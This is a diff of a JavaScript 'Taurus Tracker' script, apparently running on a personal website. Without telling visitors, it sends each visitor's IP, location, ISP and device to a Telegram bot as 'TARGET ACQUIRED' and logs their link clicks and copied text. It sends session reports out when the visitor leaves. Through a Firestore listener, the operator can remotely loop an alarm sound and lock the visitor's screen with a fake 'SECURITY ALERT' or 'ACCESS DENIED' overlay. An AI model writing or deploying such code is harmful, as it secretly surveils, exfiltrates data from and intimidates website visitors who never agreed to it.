@@ -1,13 +1,8 @@
-
-// TAURUS TRACKER v2.2 (SINGLE SHOT & ROBUST)
+// TAURUS TRACKER v2.3 (SESSION CONTINUITY & CLEAN REPORT)
 (function () {
-    // 1. IDEMPOTENCY CHECK (Prevents 4x Messages)
-    if (window.TAURUS_RUNNING) {
-        console.warn("⚠️ Taurus Tracker already running. Skipping duplicate.");
-        return;
-    }
+    if (window.TAURUS_RUNNING) return;
     window.TAURUS_RUNNING = true;
-    console.log("🚀 Taurus Tracker v2.2 Started");
+    console.log("🚀 Taurus Tracker v2.3 (Continuity Mode)");
 
     // --- CONFIGURATION ---
     const CONFIG = {
@@ -16,16 +11,17 @@
         ipApi: 'https://ipapi.co/json/'
     };
 
-    // --- STATE ---
-    let sessionLog = [];
+    // --- STATE MANAGEMENT ---
     let sessionID = localStorage.getItem('taurus_sid') || 'sess_' + Math.random().toString(36).substring(2, 9);
     localStorage.setItem('taurus_sid', sessionID);
-    let deviceData = getSimpleDevice();
+
+    // Restore logs from previous page if internal navigation
+    let sessionLog = JSON.parse(localStorage.getItem('taurus_logs') || "[]");
+    let isInternalNav = false;
     let alarmAudio = new Audio("https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3");
     let audioUnlocked = false;
 
-    // --- AUDIO UNLOCKER (Browser Policy Fix) ---
-    // Browsers block audio until user interacts. We hijack the first click to unlock it.
+    // --- AUDIO UNLOCKER ---
     document.addEventListener('click', () => {
         if (!audioUnlocked) {
             alarmAudio.volume = 0;
@@ -34,8 +30,8 @@
                 alarmAudio.currentTime = 0;
                 alarmAudio.volume = 1;
                 audioUnlocked = true;
-                console.log("🔊 Audio Context Unlocked");
-            }).catch(e => console.log("Audio unlock pending...", e));
+                console.log("🔊 Audio Unlocked");
+            }).catch(e => { });
         }
     }, { once: true, capture: true });
 
@@ -45,6 +41,7 @@
             chat_id: CONFIG.chatId,
             text: text,
             parse_mode: 'HTML',
+            disable_web_page_preview: true, // Clean Report (No Images)
             reply_markup: buttons ? { inline_keyboard: buttons } : undefined
         };
         fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
@@ -55,7 +52,7 @@
         }).catch(err => console.error("Telegram Fail:", err));
     }
 
-    // --- DEVICE DETECTION (Improved) ---
+    // --- DEVICE DETECTION ---
     function getSimpleDevice() {
         const ua = navigator.userAgent;
         let type = "Desktop";
@@ -64,40 +61,44 @@
         return { type, platform: navigator.platform, ua };
     }
 
-    // --- MAIN LOGIC: SINGLE MESSAGE FLOW ---
-    // Wait for IP (max 3.5s), then Send ONCE.
-    Promise.race([
-        fetch(CONFIG.ipApi).then(res => res.json()),
-        new Promise(resolve => setTimeout(() => resolve(null), 3500))
-    ]).then(ipData => {
-        const hasIP = ipData && ipData.ip;
-        const loc = hasIP ? `${ipData.city}, ${ipData.country_code}` : "Hidden Location";
-        const ip = hasIP ? ipData.ip : "IP Timeout";
-        const org = hasIP ? ipData.org : "Unknown ISP";
+    // --- INITIALIZATION ---
+    // If coming from internal nav, DON'T send "Target Acquired" again.
+    const wasInternal = sessionStorage.getItem('taurus_internal_flag');
+    sessionStorage.removeItem('taurus_internal_flag'); // clear flag
 
-        // CONSOLIDATED MESSAGE
-        const text = `🎯 <b>TARGET ACQUIRED</b>\n` +
-            `🆔 <code>${sessionID}</code>\n` +
-            `💻 ${deviceData.type}\n` +
-            `🌍 ${loc}\n` +
-            `🏢 ${org}\n` +
-            `📡 ${ip}`;
+    if (wasInternal) {
+        console.log("🔄 Internal Navigation Detected. Resuming Session.");
+        initDatabaseSync(); // Just reconnect DB
+    } else {
+        // NEW SESSION START
+        sessionLog = []; // Clear old logs
+        localStorage.setItem('taurus_logs', "[]");
 
-        const buttons = [
-            [{ text: "🔔 Alarm", callback_data: `alarm_${sessionID}` },
-            { text: "🚫 Block", callback_data: `block_${sessionID}` }],
-            [{ text: "✅ Unblock", callback_data: `unblock_${sessionID}` }]
-        ];
+        Promise.race([
+            fetch(CONFIG.ipApi).then(res => res.json()),
+            new Promise(r => setTimeout(() => r({}), 3500))
+        ]).then(ipData => {
+            const ip = ipData.ip || "IP Timeout";
+            const loc = ipData.city ? `${ipData.city}, ${ipData.country_code}` : "Unknown";
 
-        sendTelegram(text, buttons);
+            sendTelegram(
+                `🎯 <b>TARGET ACQUIRED</b>\n` +
+                `🆔 <code>${sessionID}</code>\n` +
+                `💻 ${getSimpleDevice().type}\n` +
+                `🌍 ${loc} | 📡 ${ip}`,
+                [
+                    [{ text: "🔔 Alarm", callback_data: `alarm_${sessionID}` },
+                    { text: "🚫 Block", callback_data: `block_${sessionID}` }],
+                    [{ text: "✅ Unblock", callback_data: `unblock_${sessionID}` }]
+                ]
+            );
 
-        // SYNC TO DB
-        initDatabaseSync(ip, ipData);
-    });
+            initDatabaseSync(ip, ipData);
+        });
+    }
 
-    // --- DATABASE & COMMAND LISTENER ---
-    function initDatabaseSync(ip, ipData) {
-        // Wait for Firebase to load if needed
+    // --- DATABASE SYNC ---
+    function initDatabaseSync(ip = null, ipData = null) {
         const checkDB = setInterval(() => {
             if (window.firebase && window.db) {
                 clearInterval(checkDB);
@@ -108,22 +109,25 @@
 
     function connectFirestore(ip, ipData) {
         const docRef = db.collection('visitors_v1').doc(sessionID);
+        // Only update static data if we have it (fresh entry)
+        if (ip) {
+            docRef.set({
+                ip: ip,
+                location: ipData || {},
+                device: getSimpleDevice(),
+                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                status: 'online',
+                action: 'none'
+            }, { merge: true });
+        } else {
+            docRef.update({ status: 'active', last_seen: firebase.firestore.FieldValue.serverTimestamp() }).catch(() => { });
+        }
 
-        // 1. Write Session
-        docRef.set({
-            ip: ip,
-            location: ipData || {},
-            device: deviceData,
-            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-            status: 'online',
-            action: 'none'
-        }, { merge: true }).catch(e => console.error("DB Write Error", e));
-
-        // 2. Listen for Commands
+        // --- COMMAND LISTENER ---
         docRef.onSnapshot((doc) => {
             if (!doc.exists) return;
             const data = doc.data();
-            if (data.action) executeCommand(data.action);
+            if (data.action && data.action !== 'none') executeCommand(data.action);
         });
     }
 
@@ -131,20 +135,28 @@
     let blockOverlay = null;
 
     function executeCommand(action) {
-        console.log("⚡ COMMAND:", action);
+        console.log("⚡ EXEC CMD:", action);
+
+        // Visual Confirmation (Toast) to debug
+        showToast(`Command: ${action.toUpperCase()}`);
+
         if (action === 'alarm') {
             alarmAudio.loop = true;
-            alarmAudio.play().catch(e => alert("Audio Blocked! Click anywhere to enable."));
+            alarmAudio.play().catch(() => showToast("Audio Blocked - Tap Screen"));
             showBlockScreen("🚨 SECURITY ALERT 🚨", "System Locked by Admin");
         }
         else if (action === 'block') {
-            showBlockScreen("� ACCESS DENIED", "You have been blocked.");
+            showBlockScreen("🚫 ACCESS DENIED", "You have been blocked.");
         }
         else if (action === 'unblock') {
-            alarmAudio.pause();
-            alarmAudio.currentTime = 0;
-            if (blockOverlay) blockOverlay.style.display = 'none';
+            stopAlarm();
         }
+    }
+
+    function stopAlarm() {
+        if (alarmAudio) { alarmAudio.pause(); alarmAudio.currentTime = 0; }
+        if (blockOverlay) blockOverlay.style.display = 'none';
+        showToast("System Unlocked");
     }
 
     function showBlockScreen(title, msg) {
@@ -159,20 +171,49 @@
         blockOverlay.style.display = 'flex';
     }
 
-    // --- LOGGING & EXIT ---
+    function showToast(msg) {
+        const toast = document.createElement('div');
+        toast.innerText = msg;
+        toast.style.cssText = "position:fixed;top:20px;right:20px;background:gold;color:black;padding:10px;border-radius:5px;z-index:100000;font-weight:bold;font-family:sans-serif;";
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3000);
+    }
+
+    // --- LOGGING & NAVIGATION LOGIC ---
     function logAndBuffer(action) {
-        sessionLog.push(`[${new Date().toLocaleTimeString()}] ${action}`);
-        if (sessionLog.length > 20) flushExit();
+        const entry = `[${new Date().toLocaleTimeString()}] ${action}`;
+        sessionLog.push(entry);
+        localStorage.setItem('taurus_logs', JSON.stringify(sessionLog));
     }
 
-    function flushExit(reason = "Exit") {
-        if (sessionLog.length === 0) return;
-        sendTelegram(`📝 <b>REPORT (${reason})</b>\n` + sessionLog.join('\n'));
-        sessionLog = [];
-    }
+    // Internal Link Detection
+    document.addEventListener('click', (e) => {
+        const link = e.target.closest('a');
+        if (link) {
+            const href = link.getAttribute('href');
+            logAndBuffer(`Click: ${link.href}`); // Use full href for log
+            // Check internal
+            if (href && (href.startsWith('/') || href.startsWith('#') || href.includes('omeryigitler.com') || !href.startsWith('http'))) {
+                isInternalNav = true;
+                sessionStorage.setItem('taurus_internal_flag', 'true');
+            }
+        }
+    });
 
-    window.addEventListener('copy', () => logAndBuffer("Copy"));
-    document.addEventListener('click', (e) => { if (e.target.tagName === 'A') logAndBuffer(`Click: ${e.target.href}`); });
-    document.addEventListener('visibilitychange', () => { if (document.hidden) flushExit("Hidden"); });
+    window.addEventListener('copy', () => logAndBuffer(`Copy: "${document.getSelection().toString().substring(0, 50)}..."`));
+
+    // FLUSH ON EXIT (Only if NOT internal nav)
+    window.addEventListener('pagehide', () => { // reliable on mobile
+        if (!isInternalNav) {
+            if (sessionLog.length > 0) {
+                const text = `📝 <b>SESSION REPORT (Final)</b>\n` +
+                    `🆔 <code>${sessionID}</code>\n` +
+                    sessionLog.join('\n');
+                sendTelegram(text);
+                localStorage.removeItem('taurus_logs'); // Clear logs
+                localStorage.setItem('taurus_sid', 'sess_' + Math.random().toString(36).substring(2, 9)); // Reset Session
+            }
+        }
+    });
 
 })();
